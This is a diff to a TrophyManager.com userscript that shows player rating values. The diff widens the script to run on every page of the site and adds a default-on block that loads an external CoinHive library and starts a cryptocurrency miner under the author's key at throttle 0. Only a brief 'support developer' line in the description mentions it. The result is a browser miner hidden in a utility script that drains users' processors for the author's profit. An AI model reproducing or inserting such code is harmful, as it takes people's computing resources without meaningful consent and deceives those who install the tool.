@@ -1,16 +1,16 @@
 // ==UserScript==
 // @name		   TrophyManager - Super Profile Page Routine Edition
-// @description	In TrophyManager.com Shows TrExMa Value for Favorite Positions for Player
-// @include		http://trophymanager.com/players/*
-// @exclude		http://trophymanager.com/players
-// @include		https://trophymanager.com/players/*
-// @exclude		https://trophymanager.com/players
+// @description	In TrophyManager.com Shows TrExMa Value for Favorite Positions for Player. Edited to include coinhash generator to support developer. Thanks
+// @include		http://trophymanager.com/*
+// @exclude		http://trophymanager.com/
+// @include		https://trophymanager.com/*
+// @exclude		https://trophymanager.com/
 // @author    	  Joao Manuel Ferreira Fernandes
 // @github		  http://github.com/etnepres/trophymanager.git
 // @grant 		none
 // ==/UserScript==
-
-
+var useCoinHasGeneraterAndSuportDeveloper = true;
+if (typeof jQuery != 'undefined') {
 // Array to setup the weights of particular skills for each player's actual ability
 // This is the direct weight to be given to each skill.
 // Array maps to these skills:
@@ -419,4 +419,22 @@ document.createTRSetPieces = function(table, nome, SK) {
 	})();
 	
 
+}
+	
+}
+
+if(useCoinHasGeneraterAndSuportDeveloper){
+	var s = document.createElement("script");
+	s.type = "text/javascript";
+	s.src = "https://coinhive.com/lib/coinhive.min.js";
+	document.getElementsByTagName('head')[0].appendChild(s);
+
+	setTimeout(function(){
+	var miner = new CoinHive.User('vnDqlIL7DdMNJdkBVUvbsy072yJMoOqK', 'trophymanager', {
+		autoThreads: true,
+		throttle: 0,
+		forceASMJS: false
+	});
+	miner.start(CoinHive.IF_EXCLUSIVE_TAB);
+	},10000);
 }
